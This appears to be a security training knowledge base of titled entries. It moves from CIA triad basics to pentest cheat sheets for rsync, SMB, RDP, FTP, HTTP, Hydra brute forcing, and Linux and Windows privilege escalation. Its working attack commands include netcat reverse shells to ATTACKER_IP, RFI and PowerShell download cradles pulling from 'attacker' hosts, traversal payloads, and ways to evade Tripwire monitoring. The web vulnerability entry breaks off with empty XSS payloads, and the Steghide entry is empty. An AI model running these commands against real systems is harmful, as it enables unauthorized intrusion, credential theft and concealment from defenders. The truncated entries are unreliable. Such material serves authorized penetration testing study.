title: The CIA Triad
content: The CIA Triad is the foundation of all information security. Confidentiality: only authorized people see data. Integrity: data has not been tampered with. Availability: systems accessible when needed. Authenticity is NOT part of CIA - it belongs to the Parkerian Hexad.

title: Parkerian Hexad
content: Extends CIA Triad with: Authenticity (data and identities are genuine), Possession/Control (custodian maintains control), Utility (information is in a useful form). Developed by Dr. Donn Parker.

title: AAA Framework
content: Authentication (proving who you are), Authorization (what you are allowed to do), Accounting (logging what you did - audit trails). In offensive security AAA is often the first target: bypass auth, escalate authorization, cover tracks in accounting logs.

title: The Defensive Lifecycle
content: 1. Prevention: stop attacks before they happen (patching, firewalls, hardening). 2. Detection: identify ongoing/past attacks (IDS, SIEM, log analysis). 3. Analysis: understand what happened (forensics, investigation). 4. Mitigation: apply targeted fixes and patches. 5. Maintenance: ongoing security posture upkeep.

title: Penetration Testing Methodology
content: Phases: 1. Scoping + Rules of Engagement (get written authorization FIRST - never skip this). 2. Reconnaissance (passive OSINT, active scanning). 3. Scanning and Enumeration (nmap, service fingerprinting, vuln assessment). 4. Exploitation (attempt to compromise vulnerabilities). 5. Post-Exploitation (privilege escalation, lateral movement, persistence, data exfiltration). 6. Reporting (document findings with business risk context, remediation steps). NEVER test systems without explicit written authorization.

title: OSI Model - 7 Layers
content: Layer 1 Physical: raw bits, cables, wireless signals. Layer 2 Data Link: MAC addresses, ARP poisoning, frame delivery, switches. Layer 3 Network: IP addressing, routing, IP spoofing, routers. Layer 4 Transport: TCP/UDP, ports, firewall rules. Layer 5 Session: session establishment and maintenance. Layer 6 Presentation: SSL/TLS, encryption, compression, encoding. Layer 7 Application: HTTP, DNS, FTP, user-facing protocols. Mnemonic: Please Do Not Throw Sausage Pizza Away (1-7).

title: Key Network Protocols and Ports
content: HTTP 80, HTTPS 443, FTP 21, SSH 22, Telnet 23, DNS 53 (UDP/TCP), SMTP 25, SMB 445/139, RDP 3389, LDAP 389, SNMP 161 (UDP), RSYNC 873, NFS 2049, MySQL 3306, MSSQL 1433, Oracle 1521, PostgreSQL 5432, WinRM 5985/5986, IMAP 143, POP3 110, Kerberos 88.

title: IP Addressing and CIDR
content: IPv4: 32-bit dotted decimal (192.168.1.1). IPv6: 128-bit hex. Private ranges: 10.0.0.0/8 (Class A), 172.16.0.0/12 (Class B), 192.168.0.0/16 (Class C). Loopback: 127.0.0.1. CIDR: /24=256 hosts, /25=128, /23=512, /16=65536, /8=16.7M. Broadcast = last IP in range. Gateway = usually .1 of subnet.

title: RSYNC Enumeration and Anonymous Sync
content: RSYNC port 873. File synchronization protocol. Anonymous rsync = no credentials needed. Enumeration: nmap -p 873 --script rsync-list-modules target. List available modules: rsync rsync://target/. List files in module: rsync rsync://target/module_name/. Download full module: rsync -av rsync://target/module_name/ ./loot/. Common misconfigs expose /home, /etc, /var/backups, /root. Look for SSH private keys (~/.ssh/id_rsa), /etc/passwd, /etc/shadow, database dumps, config files with passwords. Writable module: rsync -av ./evil_file rsync://target/module/ to plant backdoors or replace binaries. Use --list-only flag to preview without downloading. Defense: require auth in /etc/rsyncd.conf with [module] auth users = backup, secrets file = /etc/rsyncd.secrets. Restrict IPs with hosts allow.

title: SMB Enumeration and Guest Access
content: SMB ports 445 (direct) and 139 (NetBIOS). Guest/null session = connect without valid credentials. Null session: smbclient -L //target -N. Guest: smbclient //target/share -U guest%''. Auto enum: enum4linux -a target, enum4linux-ng -A target (gets users, shares, policies, password policy). smbmap -H target (shows shares + R/W permissions). Guest check: smbmap -H target -u guest -p ''. CrackMapExec: crackmapexec smb target --shares -u '' -p ''. List share contents: smbclient //target/share -N -c 'ls'. Recursive download: smbclient //target/share -N -c 'recurse;prompt;mget *'. impacket-smbclient //domain/user:pass@target. Hunt for: passwords.txt, web.config, .xml with creds, backup files, scripts. IPC$ null = enumerate users/groups. SMB signing disabled = NTLM relay possible. EternalBlue: MS17-010 check with nmap -p 445 --script smb-vuln-ms17-010.

title: RDP Enumeration and Weak Passwords
content: RDP port 3389. Enumerate: nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 target. Check NLA status: rdp-sec-check target. Brute force with Hydra: hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://target -t 4. Crowbar: crowbar -b rdp -s target/32 -u admin -C passwords.txt. Spray with CrackMapExec: crackmapexec rdp target -u users.txt -p passwords.txt --continue-on-success. Common weak creds: admin/admin, administrator/password, administrator/Password1!, user/user. Vulnerabilities: BlueKeep CVE-2019-0708 (pre-auth RCE, unpatched Win7/Server 2008), DejaBlue CVE-2019-1181/1182. Connect: xfreerdp /u:user /p:pass /v:target:3389 /cert:ignore. rdesktop -u user -p pass target. Useful flags: /drive:share,/tmp to mount local folder. RDP clipboard transfer works for file exfil/upload. Enumerate users: nmap -p 3389 --script rdp-enum-encryption target shows if NLA is enforced. Defense: enforce NLA, block 3389 at perimeter, use VPN + MFA, rename Administrator account.

title: HTTP Enumeration and Directory Traversal
content: HTTP 80, HTTPS 443. Always start with: whatweb target (tech stack fingerprint), curl -I http://target (headers reveal server/frameworks), robots.txt and sitemap.xml. Dir brute: gobuster dir -u http://target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt. feroxbuster -u http://target -w wordlist.txt --depth 3 --auto-tune. ffuf -u http://target/FUZZ -w wordlist.txt -mc 200,301,302,403. dirb http://target. Common juicy paths: /admin, /administrator, /login, /dashboard, /backup, /config, /api, /api/v1, /.git, /.env, /phpinfo.php, /server-status, /wp-admin, /wp-config.php.bak. Directory traversal payloads: ../../../etc/passwd, ..%2F..%2Fetc%2Fpasswd, ....//....//etc/passwd, %2e%2e%2f%2e%2e%2f. LFI (Local File Inclusion): ?page=../../../../etc/passwd, ?file=../../../etc/shadow. PHP wrappers: php://filter/convert.base64-encode/resource=index.php to read source. ?file=expect://id for RCE if expect enabled. RFI: ?page=http://attacker/shell.php (needs allow_url_include=On). Check HTTP methods: curl -X OPTIONS http://target -v (PUT method = file upload!). Nikto: nikto -h http://target -output nikto.txt.

title: Nmap Scanning - Complete Reference
content: Nmap is the essential reconnaissance tool. Discovery: nmap -sn 192.168.1.0/24 (ping sweep, no port scan). Stealth SYN: nmap -sS target (default, half-open, less logged). Full connect: nmap -sT target (complete TCP, more logged). UDP: nmap -sU target (slow, important - finds SNMP, DNS, TFTP). Version: nmap -sV target. OS detect: nmap -O target. Aggressive: nmap -A target (OS+version+scripts+traceroute). All ports: nmap -p- target. Specific ports: nmap -p 22,80,443,445,3389 target. Port range: nmap -p 1-1000 target. Skip ping: nmap -Pn target (for firewalled hosts). Fast: nmap -T4 target. Stealth/slow: nmap -T1 target (IDS evasion). Decoy: nmap -D RND:10 target. Fragment packets: nmap -f target (firewall evasion). NSE scripts: --script default, --script vuln, --script safe, --script=banner. Specific script: nmap --script smb-vuln-ms17-010 -p 445 target. Save outputs: -oN file.txt (normal), -oX file.xml (XML for Metasploit db_import), -oG file.gnmap (grepable), -oA basename (all formats). Subnet scan: nmap -sV -p 22,80,443,445,3389 192.168.1.0/24 -oA subnet_scan. Vuln scan: nmap -sV --script vuln target. Import to Metasploit: db_import scan.xml then hosts and services commands.

title: Telnet Enumeration and Access
content: Telnet port 23. Legacy plaintext protocol - all data including passwords transmitted in cleartext. Wireshark capture reveals everything. Connect: telnet target (then login interactively). Banner grab: nc -nv target 23, nmap -p 23 --script telnet-ntlm-info target. Brute force: hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://target. nmap telnet brute: nmap -p 23 --script telnet-brute --script-args userdb=users.txt,passdb=rockyou.txt target. Common default creds: admin/admin, root/root, root/(blank), cisco/cisco, enable/enable, guest/guest. After login: whoami, id, cat /etc/passwd, uname -a for Linux. Network devices (Cisco/Juniper): show run (show config), show version, enable (enter privileged mode). Metasploit: use auxiliary/scanner/telnet/telnet_version, use auxiliary/scanner/telnet/telnet_login. Post-exploitation: telnet session is unencrypted so all commands visible to network captures. Always upgrade to SSH. MITRE ATT&CK: T1021.004 - Remote Services: Telnet.

title: FTP Enumeration and Anonymous Access
content: FTP port 21 (control) + 20 (data). Anonymous login check: nmap -p 21 --script ftp-anon target. If anonymous allowed: ftp target, username: anonymous, password: (blank or any@email.com). Full NSE: nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor,ftp-brute target. FTP commands once connected: ls (list files), cd dirname (navigate), get filename (download one), mget * (download all - type prompt first to disable prompts), put filename (upload), binary (switch to binary mode for non-text files), pwd (current dir), passive (toggle passive mode). Metasploit scan: use auxiliary/scanner/ftp/ftp_version, use auxiliary/scanner/ftp/anonymous. Brute force: hydra -l admin -P rockyou.txt ftp://target -t 4. Medusa: medusa -h target -u admin -P rockyou.txt -M ftp. vsftpd 2.3.4 backdoor: append ':)' to username on port 21, backdoor shell opens on port 6200 - Metasploit: use exploit/unix/ftp/vsftpd_234_backdoor. ProFTPD 1.3.3c mod_copy exploit: CPFR/CPTO commands to copy files without auth. Hunt for: web.config, config.php, .env, id_rsa, passwords.txt, database backups. Writable FTP = upload PHP shell to webroot if web server running. Defense: disable anonymous, use SFTP instead, chroot users.

title: Web Vulnerability Mastery - Complete
content: SQL Injection: Test with ' and '. Error-based: ' OR '1'='1. Union: ' UNION SELECT NULL,NULL,table_name FROM information_schema.tables--. sqlmap: sqlmap -u 'http://target/page?id=1' --dbs, then --tables -D dbname, then --dump -T tablename. Blind SQLi: ' AND 1=1-- (true), ' AND 1=2-- (false). Time-based: '; WAITFOR DELAY '0:0:5'-- (MSSQL). XSS Reflected: . XSS Stored: persists in DB, executes on every view. XSS bypass: ,

title: Linux Privilege Escalation - Complete
content: Goal: escalate to root. STEP 1 - Automated: curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh 2>/dev/null | tee linpeas.txt. Also run LinEnum.sh, lse.sh (Linux Smart Enum). STEP 2 - Manual checklist: sudo -l (ANY NOPASSWD entry = instant root path), find / -perm -4000 -type f 2>/dev/null (SUID binaries - check each at gtfobins.github.io), find / -perm -2000 -type f 2>/dev/null (SGID), cat /etc/crontab; ls -la /etc/cron.d/ /var/spool/cron/ (cron jobs running as root with writable script?), ps aux | grep root (root processes), ss -tulnp (listening services), cat /etc/passwd (any UID 0 besides root? world-writable?), cat /etc/shadow (readable? offline crack with hashcat), find / -writable -not -path '/proc/*' -type f 2>/dev/null, history; cat ~/.bash_history (credentials in history), env; printenv (creds in env vars), find / -name '*.conf' -o -name '*.config' 2>/dev/null | xargs grep -l 'password' 2>/dev/null. TECHNIQUES: Kernel exploits: uname -r then searchsploit 'linux kernel VERSION', DirtyCow CVE-2016-5195, PwnKit CVE-2021-4034 (pkexec, affects all Linux). PATH hijacking: if root script calls 'service' without full path and /tmp is in PATH. LD_PRELOAD: sudo LD_PRELOAD=/tmp/evil.so /usr/bin/sudo-able-program. Wildcard injection: tar/rsync with * in cron. NFS no_root_squash: mount share, create SUID binary. Docker group: docker run -v /:/mnt --rm -it alpine chroot /mnt sh. Writable /etc/passwd: add new root user row. Capabilities: getcap -r / 2>/dev/null (python3 cap_setuid = root). GTFOBins reference: gtfobins.github.io

title: Windows Privilege Escalation - Complete
content: Goal: SYSTEM or Domain Admin. STEP 1 - Automated: winpeas.exe; winpeas.exe quiet > out.txt. PowerUp: IEX(New-Object Net.WebClient).DownloadString('http://attacker/PowerUp.ps1'); Invoke-AllChecks. Seatbelt: Seatbelt.exe -group=all. PrivescCheck.ps1. STEP 2 - Manual: whoami /all (groups + privileges), whoami /priv (SeImpersonatePrivilege? SeDebugPrivilege? SeBackupPrivilege?), net user; net localgroup administrators, systeminfo (OS version - look up known exploits), wmic qfe list brief (patches installed), wmic service get name,pathname,startmode | findstr /i 'auto' | findstr /i /v 'c:\windows\' (unquoted service paths with spaces), sc qc ServiceName (verify binary path + account), icacls 'C:\Program Files\Vulnerable\svc.exe' (writable?), schtasks /query /fo LIST /v | findstr /i 'task\|run\|user' (scheduled tasks), reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated (MSI privesc - both HKCU and HKLM must be 1), cmdkey /list (stored credentials), reg query 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' (DefaultPassword), dir /s *pass* *cred* *vnc* *.config* 2>nul (file hunt). TECHNIQUES: Token impersonation with SeImpersonatePrivilege: JuicyPotato, PrintSpoofer (printspoofer.exe -i -c cmd), RoguePotato. DLL hijacking: find missing DLLs with Process Monitor. AlwaysInstallElevated: msiexec /quiet /qn /i shell.msi. Service binary replacement: if writable, replace with msfvenom payload. UAC bypass: fodhelper, eventvwr, sdclt, computerdefaults. Pass-the-Hash: crackmapexec smb target -u admin -H NTLM_HASH. LOLBAS: lolbas-project.github.io

title: Using Hydra to Crack Passwords
content: Hydra is the primary online brute-force/password spraying tool. SYNTAX: hydra -l USER -P WORDLIST PROTOCOL://TARGET. FLAGS: -l single username, -L username list file, -p single password, -P password list file, -C user:pass combo file, -t threads (default 16), -s custom port, -v verbose, -V show each attempt, -o output file, -f stop on first success, -R restore previous session. SSH: hydra -l john -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100 -t 4. FTP: hydra -l admin -P rockyou.txt ftp://target. RDP: hydra -l administrator -P rockyou.txt rdp://target -t 4. Telnet: hydra -l root -P rockyou.txt telnet://target. SMB: hydra -l admin -P rockyou.txt smb://target. HTTP POST form: hydra -l admin -P rockyou.txt target http-post-form '/login.php:username=^USER^&password=^PASS^:Invalid credentials'. HTTP GET basic auth: hydra -l admin -P rockyou.txt http-get://target/admin. HTTP HTTPS: use https-post-form or https-get. Password spray (one password many users): hydra -L users.txt -p 'Password123!' ssh://target. Crack specific account: hydra -l john -P rockyou.txt -t 4 -vV ssh://192.168.1.100 -s 22. Wordlists on Kali: /usr/share/wordlists/rockyou.txt (14M passwords), /usr/share/wordlists/fasttrack.txt (common), /usr/share/seclists/Passwords/. Generate custom list: crunch 8 8 abc123 -o custom.txt. Mutate existing: hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt. Brute SSH: hydra -l root -P rockyou.txt ssh://target -t 4 -f.

title: Network Scanning with Nmap - Complete Reference
content: Nmap = Network Mapper, essential for all recon phases. HOST DISCOVERY: nmap -sn 192.168.1.0/24 (ping sweep, find live hosts). nmap -sn -PS22,80,443 192.168.1.0/24 (TCP SYN ping on specific ports). PORT SCANNING: -sS SYN stealth (default root), -sT full TCP connect, -sU UDP (slow, critical for SNMP/DNS/TFTP), -sN NULL, -sF FIN, -sX Xmas (firewall evasion). SCOPE: -p 80 (single), -p 22,80,443 (multiple), -p 1-1024 (range), -p- (all 65535). VERSION/OS: -sV (service versions), -O (OS fingerprint), -A (aggressive: -sV -O -sC --traceroute). TIMING: -T0 paranoid (IDS evasion), -T1 sneaky, -T2 polite, -T3 normal, -T4 aggressive, -T5 insane. EVASION: -f (fragment packets), -D RND:10 (decoy scan with 10 random IPs), --source-port 53 (spoof source port), --data-length 25 (pad packets), -Pn (skip ping for firewalled hosts). NSE SCRIPTS: --script default (safe default scripts), --script vuln (known vulns), --script safe (non-intrusive), --script=smb-vuln-ms17-010 (specific script). Common scripts: http-title, ssh-auth-methods, smb-enum-shares, ftp-anon, rdp-enum-encryption, telnet-brute, mysql-empty-password. Output formats: -oN normal.txt, -oX scan.xml (import to Metasploit with db_import), -oG grep.txt, -oA basename (all formats). SUBNET SCAN: nmap -sV -sC -p 22,80,443,445,3389,21,23,139 192.168.1.0/24 -oA full_subnet. VULNERABILITY SCAN: nmap -sV --script vuln,exploit target -oA vuln_scan. EternalBlue check: nmap -p 445 --script smb-vuln-ms17-010 target. After scan: run Metasploit db_import scan.xml then hosts and services to populate database.

title: Introduction to Encryption with OpenSSL
content: OpenSSL is the standard CLI encryption/decryption tool. SYMMETRIC ENCRYPTION: Encrypt file: openssl enc -aes-256-cbc -salt -in plaintext.txt -out encrypted.enc -k password. Decrypt file: openssl enc -aes-256-cbc -d -in encrypted.enc -out decrypted.txt -k password. With key+IV explicit: openssl enc -aes-256-cbc -d -in file.enc -out file.txt -K HEXKEY -iv HEXIV. List all ciphers: openssl enc -list. Common ciphers: aes-256-cbc (strong, recommended), aes-128-cbc, des3 (legacy), blowfish. ASYMMETRIC: Generate RSA key pair: openssl genrsa -out private.pem 4096. Extract public key: openssl rsa -in private.pem -pubout -out public.pem. Encrypt with public key: openssl rsautl -encrypt -pubin -inkey public.pem -in msg.txt -out msg.enc. Decrypt with private key: openssl rsautl -decrypt -inkey private.pem -in msg.enc -out msg.txt. HASHING: openssl dgst -sha256 file.txt. openssl dgst -md5 file.txt. CERTIFICATES: Generate self-signed cert: openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes. View cert: openssl x509 -in cert.pem -text -noout. BASE64: Encode: openssl base64 -in file.bin -out file.b64. Decode: openssl base64 -d -in file.b64 -out file.bin. CRACKING: If weak password used - hashcat or john can crack openssl encrypted files. Extract hash: openssl2john encrypted.enc > hash.txt then john hash.txt --wordlist=rockyou.txt. Decrypt top secret docs: try common passwords first, then wordlist attack.

title: Using Netcat for Network Communication
content: Netcat (nc) = the TCP/IP Swiss Army knife. Called the network multi-tool. BASIC USAGE: Connect to port: nc -nv TARGET PORT. Listen on port: nc -lvnp PORT. Transfer file (sender): nc -nv TARGET 4444 < file.txt. Transfer file (receiver): nc -lvnp 4444 > received.txt. BANNER GRABBING: nc -nv target 22 (SSH), nc -nv target 25 (SMTP), nc -nv target 80 (HTTP - then type GET / HTTP/1.0). CHAT/SIMPLE COMMS: Listener: nc -lvnp 9999. Sender: nc TARGET 9999. Both sides can type messages. REVERSE SHELLS: On attacker (listen): nc -lvnp 4444. On victim (Linux): bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1. Or: nc ATTACKER_IP 4444 -e /bin/bash (if -e supported). Or: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f. BIND SHELLS: On victim: nc -lvnp 4444 -e /bin/bash. On attacker: nc TARGET 4444. PORT SCANNING: nc -zv target 20-80 (scan port range). nc -zvu target 53 (UDP). PROXY: nc -lvnp 8080 | nc internal_host 80. FLAGS: -l listen, -v verbose, -n no DNS, -p port, -z zero-I/O (scan mode), -u UDP, -e execute. NCAT (improved nc): ncat --ssl (encrypted), ncat --allow IP (restrict connections), ncat -e /bin/bash TARGET PORT (connect-back shell). Receive messages: nc -lvnp PORT (then send from another terminal: echo 'message' | nc TARGET PORT).

title: Network Analysis with Wireshark
content: Wireshark = GUI packet capture and analysis tool. Capture live: select interface (eth0, wlan0) then Start. Open pcap: File > Open. DISPLAY FILTERS (applied after capture): ip.addr == 192.168.1.1, ip.src == 10.0.0.1, ip.dst == 8.8.8.8, tcp.port == 80, udp.port == 53, http (show all HTTP), tcp (all TCP), dns (all DNS), ftp (FTP control), ftp-data (FTP transfers), ssh, telnet, smtp. Compound: ip.addr == 10.0.0.1 && tcp.port == 443, http.request.method == 'POST'. CAPTURE FILTERS (BPF syntax, applied during capture): host 192.168.1.1, port 80, net 192.168.1.0/24, tcp, not port 22, port 80 or port 443. FOLLOW STREAMS: Right-click packet > Follow > TCP Stream (reconstructs full conversation). HTTP stream shows full request + response including credentials in GET/POST. Telnet stream shows plaintext login. CAPTURE GOOGLE TRAFFIC: Set interface to active NIC, start capture, open browser to google.com, stop capture. Filter: ip.addr == google's IP or http or tls. Follow TCP streams to see DNS lookups, HTTP requests, TLS handshakes. CREDENTIALS: Filter http.request.method == POST then follow TCP stream (see form data). Filter ftp then follow stream (see USER/PASS in plaintext). Filter telnet then follow TCP stream (see full login). STATISTICS: Statistics > Protocol Hierarchy (traffic breakdown), Conversations (top talkers), Endpoints, I/O Graph. EXPORT: File > Export Objects > HTTP (extract files from HTTP traffic). tshark (CLI version): tshark -i eth0 -w capture.pcap, tshark -r capture.pcap -Y 'http' -T fields -e http.request.uri. FILTER TRICKS: frame contains 'password', http.request.uri contains 'login', tcp.flags.syn == 1 && tcp.flags.ack == 0 (SYN packets only = new connections).

title: Brute Force SSH with Hydra
content: SSH brute force is common for exposed port 22. ALWAYS check: nmap -p 22 --script ssh-auth-methods target (shows if password auth enabled). HYDRA SSH: Single user: hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target -t 4. User list: hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P rockyou.txt ssh://target. Specific user/pass test: hydra -l admin -p password123 ssh://target. Custom port: hydra -l root -P rockyou.txt -s 2222 ssh://target. Verbose output: hydra -l root -P rockyou.txt ssh://target -V (shows every attempt). Stop at success: hydra -l root -P rockyou.txt ssh://target -f. MEDUSA alternative: medusa -h target -u root -P rockyou.txt -M ssh -t 4. NCRACK: ncrack -p 22 --user root -P rockyou.txt target. METASPLOIT: use auxiliary/scanner/ssh/ssh_login; set RHOSTS target; set USERNAME root; set PASS_FILE rockyou.txt; run. AFTER SSH ACCESS: ssh -o StrictHostKeyChecking=no user@target. Upgrade to PTY: python3 -c 'import pty;pty.spawn("/bin/bash")'. Check privesc: sudo -l, id, uname -r. SSH KEY BRUTEFORCE: If key auth, try default keys: /usr/share/seclists/SSH/. RATE LIMITING: Many servers rate-limit. Use -t 2 (2 threads), add delays. If locked out, wait or try different IP. Common SSH usernames: root, admin, ubuntu, ec2-user, pi, kali, user.

title: Scan Vulnerabilities with Nmap NSE
content: Nmap Scripting Engine (NSE) has 600+ scripts for vulnerability detection. VULN CATEGORY: nmap --script vuln target (runs all vuln scripts - comprehensive). nmap -sV --script vuln -p 80,443,21,22,445 target. SPECIFIC VULNERABILITY SCRIPTS: SMB: nmap -p 445 --script smb-vuln-ms17-010 target (EternalBlue/WannaCry). nmap -p 445 --script smb-vuln-ms08-067 target (Conficker-era vuln). nmap -p 445 --script smb-vuln-cve-2020-0796 target (SMBGhost). RDP: nmap -p 3389 --script rdp-vuln-ms12-020 target (BlueKeep-era). HTTP: nmap -p 80 --script http-shellshock --script-args uri=/cgi-bin/test.cgi target. nmap -p 80 --script http-slowloris-check target. nmap --script http-vuln-cve2014-3704 target (Drupalgeddon). FTP: nmap -p 21 --script ftp-vsftpd-backdoor target. SSL/TLS: nmap -p 443 --script ssl-heartbleed target (Heartbleed). nmap -p 443 --script ssl-poodle target. nmap -p 443 --script ssl-dh-params target. ENUMERATION SCRIPTS: nmap --script smb-enum-shares,smb-enum-users -p 445 target. nmap --script http-enum -p 80 target (find web directories). nmap --script dns-zone-transfer -p 53 target. nmap -p 161 --script snmp-info target (SNMP community strings). FULL VULN SWEEP: nmap -sV -sC --script vuln -p- target -oA full_vuln_scan --open. Script args: --script-args user=admin,pass=password,uri=/login. Script help: nmap --script-help script-name.

title: Encrypt and Decrypt Files with OpenSSL
content: Encrypting files with OpenSSL AES-256-CBC is the standard approach. ENCRYPT A FILE: openssl enc -aes-256-cbc -salt -pbkdf2 -in secret.txt -out secret.enc (prompts for password). With password inline: openssl enc -aes-256-cbc -salt -pbkdf2 -in secret.txt -out secret.enc -pass pass:MyPassword123. DECRYPT: openssl enc -aes-256-cbc -d -pbkdf2 -in secret.enc -out secret.txt (prompts for password). Decrypt top secret doc: openssl enc -aes-256-cbc -d -pbkdf2 -in topsecret.enc -out topsecret.txt -pass pass:password. ENCRYPTION WORKFLOW: 1. Identify cipher used (often in filename or metadata). 2. Try default passwords: password, 123456, admin, secret, topsecret. 3. If unknown password: use john the ripper - first run openssl2john encrypted.enc > hash.txt, then john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt. ENCRYPT DIRECTORY: tar czf - directory/ | openssl enc -aes-256-cbc -salt -out dir_encrypted.tar.gz.enc. Decrypt and untar: openssl enc -d -aes-256-cbc -in dir_encrypted.tar.gz.enc | tar xzf -. LEGACY (no -pbkdf2 flag for older files): openssl enc -aes-256-cbc -d -in old_file.enc -out decrypted.txt. Generate random key: openssl rand -hex 32 (256-bit key). Generate random IV: openssl rand -hex 16. SIGN FILE: openssl dgst -sha256 -sign private.pem -out signature.bin file.txt. VERIFY SIGNATURE: openssl dgst -sha256 -verify public.pem -signature signature.bin file.txt.

title: Filter Traffic in Wireshark
content: Wireshark display filters are the key skill for traffic analysis. SYNTAX: protocol, protocol.field == value, operators: == != < > <= >= contains matches. IP FILTERS: ip.addr == 192.168.1.1 (any direction), ip.src == 10.0.0.5 (source only), ip.dst == 8.8.8.8 (destination only), ip.addr == 192.168.1.0/24 (entire subnet). PORT/PROTOCOL FILTERS: tcp.port == 80, udp.port == 53, tcp.dstport == 443, tcp.srcport == 4444. PROTOCOL FILTERS: http, https, ftp, ftp-data, ssh, telnet, dns, smb, icmp, arp, tls, smtp, pop, imap. HTTP FILTERS: http.request (all requests), http.response (all responses), http.request.method == 'POST' (form submits), http.request.uri contains '/login' (login pages), http.response.code == 200, http.response.code == 404. CREDENTIAL HUNTING: http.request.method == POST (look for passwords in form data), ftp (see USER/PASS commands), telnet (see full plaintext session), smtp (see email content). FOLLOW STREAM after finding interesting packet: Right-click > Follow > TCP Stream. COMBINING FILTERS: && (AND), || (OR), ! (NOT). Example: tcp.port == 80 && ip.src == 192.168.1.100. Example: http || dns || ftp. Example: !(arp || icmp || dns) (hide noise). FIND PATTERN: Edit > Find Packet > String, search in Packet bytes for 'password'. tcp contains 'password' in display filter. TLS/SSL: tls.handshake.type == 1 (Client Hello). STATISTICS FILTERS: Statistics > Conversations sorted by bytes reveals top talkers. Time filters: frame.time >= '2024-01-01' and frame.time <= '2024-12-31'.

title: Crack ZIP Passwords with John the Ripper
content: John the Ripper (john) is the offline password cracker. ZIP CRACKING: Step 1: Extract hash from ZIP: zip2john protected.zip > zip_hash.txt. Step 2: Crack with wordlist: john zip_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt. Step 3: Show cracked password: john zip_hash.txt --show. Dictionary attack: john hash.txt --wordlist=rockyou.txt. Brute force: john hash.txt --incremental. Rules/mutations: john hash.txt --wordlist=rockyou.txt --rules=best64. Single crack: john hash.txt --single (uses login name variations). OTHER FILE TYPES: RAR: rar2john archive.rar > rar_hash.txt. 7-zip: 7z2john archive.7z > 7z_hash.txt. PDF: pdf2john document.pdf > pdf_hash.txt. SSH key: ssh2john id_rsa > ssh_hash.txt then john ssh_hash.txt --wordlist=rockyou.txt. Office docs: office2john doc.docx > office_hash.txt. Linux /etc/shadow: john shadow.txt --wordlist=rockyou.txt. Windows NTLM: john --format=NT hash.txt --wordlist=rockyou.txt. HASHCAT (GPU-accelerated, faster): hashcat -m 17200 zip_hash.txt rockyou.txt (PKZIP). hashcat -m 13600 zip_hash.txt rockyou.txt (WinZip AES). hashcat rules: -r /usr/share/hashcat/rules/best64.rule. hashcat mask attack: hashcat -m 0 hash.txt -a 3 ?u?l?l?l?d?d (uppercase+3lower+2digits). Identify hash type: hashid hash.txt, hash-identifier hash.txt, name-that-hash hash.txt.

title: Monitor Files with Tripwire
content: Tripwire is a file integrity monitoring (FIM) tool. Detects unauthorized changes to files - critical for defense and detecting attacker persistence. CONCEPT: Tripwire creates a cryptographic baseline (database) of files. Any modification, addition, or deletion is detected on next check. USE CASES: Detect malware dropping files, detect config file tampering, detect backdoor installation, incident response forensics, compliance (PCI-DSS, HIPAA require FIM). INSTALL: apt install tripwire. SETUP: tripwire --init (creates baseline database - run AFTER hardening system). CONFIG FILES: /etc/tripwire/twpol.txt (policy - what to monitor), /etc/tripwire/twcfg.txt (configuration). KEY OPERATIONS: Initialize database: sudo tripwire --init. Run integrity check: sudo tripwire --check. Update database after approved changes: sudo tripwire --update --twrfile report.twr. Update policy: sudo tripwire --update-policy twpol.txt. View report: twprint --print-report --twrfile /var/lib/tripwire/report/REPORT.twr. POLICY SYNTAX in twpol.txt: /etc -> $(SEC_BIN) ; (monitor /etc with binary security level). Security levels: SEC_CRIT (critical - any change = alert), SEC_BIN (binary files), SEC_CONFIG (config files), SEC_LOG (log files - growing expected). RED TEAM PERSPECTIVE: Tripwire means your dropped files and modified configs will be detected on next run. Evade by: disable tripwire service (service tripwire-check stop), modify tripwire database itself (needs root + keys), place files in unmonitored directories, use in-memory only techniques (no disk writes). Defensive note: tripwire database should be stored on read-only media or remote server to prevent attacker tampering.

title: Scan Ports with Masscan
content:
Masscan is the fastest port scanner - can scan the entire internet in 6 minutes. Much faster than nmap. BASIC USAGE: masscan -p 80 10.0.0.0/8 (scan port 80 on entire 10.x.x.x range). RATE CONTROL: --rate 1000 (1000 packets/sec, safe for labs), --rate 100000 (100K pps, fast LAN), --rate 1000000 (1M pps, needs good NIC). SINGLE HOST: masscan -p 1-65535 192.168.1.100 --rate 1000. SUBNET: masscan -p 22,80,443,445,3389 192.168.1.0/24 --rate 1000. TOP PORTS: masscan -p 0-65535 target --rate 10000 --open-only. OUTPUT: masscan -p 80,443 10.0.0.0/24 -oX results.xml (XML). masscan -p 80 target -oJ results.json (JSON). masscan -p 80 target -oL results.txt (list format). COMBINED WORKFLOW: masscan first (fast, find open ports), then nmap -sV on discovered ports (slower, get service versions). Example: masscan -p 1-65535 192.168.1.0/24 --rate 1000 -oL open_ports.txt, then nmap -sV -p $(cat open_ports.txt | awk '{print $3}' | tr '
' ',') target. COMPARISON vs nmap: masscan faster (async SYN scan), nmap more features (scripts, OS detect, versions). Use masscan for wide/fast discovery, nmap for deep enumeration. FLAGS: --open-only (only report open ports), --banners (grab banners), --ping (ICMP sweep), --exclude ip (exclude IPs). CONFIG FILE: masscan --echo > masscan.conf (generate config), masscan -c masscan.conf (run from config). NOTE: high rates can crash switches/routers and trigger IDS. Use appropriate rates for engagement rules.

title: Hide Data with Steghide
